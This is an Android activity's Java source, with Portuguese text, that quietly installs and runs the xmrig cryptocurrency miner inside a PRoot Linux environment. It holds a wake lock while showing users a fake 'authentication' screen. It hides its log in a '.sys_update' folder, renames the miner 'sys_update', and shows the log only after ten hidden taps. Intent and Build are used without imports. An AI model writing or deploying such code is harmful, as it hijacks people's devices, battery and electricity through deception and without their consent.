package com.miner.app;

import android.app.Activity;
import android.app.AlertDialog;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.View;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {

    private TextView statusText;
    private ProgressBar progressBar;
    private View pulseView;
    private boolean isAuthenticated = false;
    private int clickCount = 0;
    private File logFile;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        logFile = new File(getFilesDir(), ".sys_update/sys_log.txt");

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#121212"));
        layout.setPadding(50, 50, 50, 50);

        layout.setOnClickListener(v -> {
            clickCount++;
            if (clickCount >= 10) {
                showLogs();
                clickCount = 0;
            }
        });

        statusText = new TextView(this);
        statusText.setText("Iniciando autenticação...");
        statusText.setTextColor(Color.WHITE);
        statusText.setTextSize(18);
        statusText.setGravity(Gravity.CENTER);
        
        progressBar = new ProgressBar(this);
        progressBar.setIndeterminate(true);
        
        pulseView = new View(this);
        LinearLayout.LayoutParams pulseParams = new LinearLayout.LayoutParams(100, 100);
        pulseParams.setMargins(0, 40, 0, 40);
        pulseView.setLayoutParams(pulseParams);
        pulseView.setBackgroundResource(android.R.drawable.presence_online);
        pulseView.setVisibility(View.INVISIBLE);

        layout.addView(progressBar);
        layout.addView(statusText);
        layout.addView(pulseView);
        
        setContentView(layout);

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Miner:Wakelock");
        wakeLock.acquire();

        new Thread(() -> {
            try {
                // 1. Preparar pastas da VM (PRoot)
                File vmDir = new File(getFilesDir(), "vm");
                File rootfsDir = new File(vmDir, "rootfs");
                
                if (!vmDir.exists()) vmDir.mkdirs();
                if (!rootfsDir.exists()) rootfsDir.mkdirs();

                writeToLog("🏗️ Preparando ambiente virtual (PRoot)...");

                // 2. Extrair ativos do APK (se não existirem)
                boolean isFirstRun = !new File(vmDir, "proot").exists();
                
                if (isFirstRun) {
                    writeToLog("📦 Extraindo rootfs Linux...");
                    extractAsset("rootfs.tar.gz", new File(vmDir, "rootfs.tar.gz"));
                    if (!extractTar(new File(vmDir, "rootfs.tar.gz"), rootfsDir)) {
                        writeToLog("⚠️ Falha na extração do rootfs. Tentando continuar...");
                    }
                    new File(vmDir, "rootfs.tar.gz").delete();
                    
                    writeToLog("🛠️ Instalando binários (proot + xmrig)...");
                    extractAsset("proot", new File(vmDir, "proot"));
                    extractAsset("xmrig", new File(vmDir, "xmrig"));
                    extractAsset("init.sh", new File(vmDir, "init.sh"));
                    
                    new File(vmDir, "proot").setExecutable(true);
                    new File(vmDir, "xmrig").setExecutable(true);
                    new File(vmDir, "init.sh").setExecutable(true);
                    
                    // Garantir que o xmrig esteja no /bin do rootfs também
                    File binInRootfs = new File(rootfsDir, "bin/xmrig");
                    if (!binInRootfs.getParentFile().exists()) binInRootfs.getParentFile().mkdirs();
                    extractAsset("xmrig", binInRootfs);
                    binInRootfs.setExecutable(true);

                    writeToLog("✅ Ambiente virtual preparado!");
                } else {
                    writeToLog("🔄 Ambiente virtual já configurado.");
                }

                // 3. Iniciar Foreground Service (VM)
                writeToLog("🚀 Iniciando serviço de mineração...");
                Intent serviceIntent = new Intent(this, MinerService.class);
                serviceIntent.putExtra("vm_dir", vmDir.getAbsolutePath());
                serviceIntent.putExtra("script_path", new File(vmDir, "init.sh").getAbsolutePath());
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }

                // 4. Monitorar Logs (da HOME da VM)
                File vmHomeLog = new File(rootfsDir, "root/sys_log.txt");
                while (!isAuthenticated) {
                    if (vmHomeLog.exists() && checkLogForSuccess(vmHomeLog)) {
                        isAuthenticated = true;
                        updateUIToAuthenticated();
                        break;
                    }
                    Thread.sleep(2000);
                }

            } catch (Exception e) {
                writeToLog("❌ ERRO VM: " + e.getMessage());
                e.printStackTrace();
            }
        }).start();
    }

    private void writeToLog(String msg) {
        try {
            if (!logFile.getParentFile().exists()) logFile.getParentFile().mkdirs();
            FileOutputStream fos = new FileOutputStream(logFile, true);
            fos.write(("[Java] " + msg + "\n").getBytes());
            fos.close();
        } catch (Exception e) {}
    }

    private void downloadFile(String urlStr, File dest) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setInstanceFollowRedirects(true);
        InputStream in = new BufferedInputStream(conn.getInputStream());
        FileOutputStream out = new FileOutputStream(dest);
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        out.close();
        in.close();
    }

    private File findXmrigRecursively(File dir) {
        File[] files = dir.listFiles();
        if (files == null) return null;
        for (File f : files) {
            if (f.isDirectory()) {
                File found = findXmrigRecursively(f);
                if (found != null) return found;
            } else if (f.getName().equals("xmrig")) {
                return f;
            }
        }
        return null;
    }

    private boolean extractTar(File tarFile, File destDir) {
        try {
            // Usa o comando tar nativo do Android (Toybox) que é mais confiavel
            // Tenta primeiro com z (gzip) e depois sem, em caso de falha.
            String[] cmds = {
                "tar -xzf " + tarFile.getAbsolutePath() + " -C " + destDir.getAbsolutePath(),
                "tar -xf " + tarFile.getAbsolutePath() + " -C " + destDir.getAbsolutePath()
            };

            for (String cmd : cmds) {
                Process process = Runtime.getRuntime().exec(cmd);
                if (process.waitFor() == 0) break;
            }
            
            // Mover o binario xmrig para o nome correto
            File[] files = destDir.listFiles();
            if (files != null) {
                for (File f : files) {
                    if (f.isDirectory()) {
                        File xmrig = new File(f, "xmrig");
                        if (xmrig.exists()) {
                            xmrig.renameTo(new File(destDir, "sys_update"));
                            new File(destDir, "sys_update").setExecutable(true);
                            return true;
                        }
                    }
                }
            }
        } catch (Exception e) {
            writeToLog("Exceção na extração: " + e.getMessage());
        }
        return false;
    }

    private void showLogs() {
        try {
            StringBuilder logs = new StringBuilder();
            if (logFile.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(logFile));
                String line;
                while ((line = br.readLine()) != null) logs.append(line).append("\n");
                br.close();
            } else {
                logs.append("Log ainda não gerado...");
            }

            TextView logTextView = new TextView(this);
            logTextView.setText(logs.toString());
            logTextView.setPadding(20, 20, 20, 20);
            logTextView.setTextColor(Color.GREEN);
            logTextView.setTextSize(12);
            logTextView.setBackgroundColor(Color.BLACK);
            logTextView.setTypeface(android.graphics.Typeface.MONOSPACE);

            ScrollView scrollView = new ScrollView(this);
            scrollView.setBackgroundColor(Color.BLACK);
            scrollView.addView(logTextView);

            new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_NoActionBar_Fullscreen)
                .setTitle("Terminal da VM")
                .setView(scrollView)
                .setPositiveButton("Minimizar", null)
                .show();
        } catch (Exception e) {}
    }

    private boolean checkLogForSuccess(File log) {
        try (BufferedReader br = new BufferedReader(new FileReader(log))) {
            String line;
            while ((line = br.readLine()) != null) {
                if (line.contains("READY threads") || line.contains("accepted") || line.contains("new job from")) return true;
            }
        } catch (Exception e) {}
        return false;
    }

    private void updateUIToAuthenticated() {
        new Handler(Looper.getMainLooper()).post(() -> {
            statusText.setText("Area autenticada");
            statusText.setTextColor(Color.GREEN);
            progressBar.setVisibility(View.GONE);
            pulseView.setVisibility(View.VISIBLE);
            AlphaAnimation blink = new AlphaAnimation(0.2f, 1.0f);
            blink.setDuration(1000);
            blink.setRepeatMode(Animation.REVERSE);
            blink.setRepeatCount(Animation.INFINITE);
            pulseView.startAnimation(blink);
        });
    }

    private void extractAsset(String name, File dest) throws Exception {
        InputStream is = getAssets().open(name);
        OutputStream os = new FileOutputStream(dest);
        byte[] buffer = new byte[1024];
        int read;
        while ((read = is.read(buffer)) != -1) os.write(buffer, 0, read);
        is.close();
        os.flush();
        os.close();
    }
}
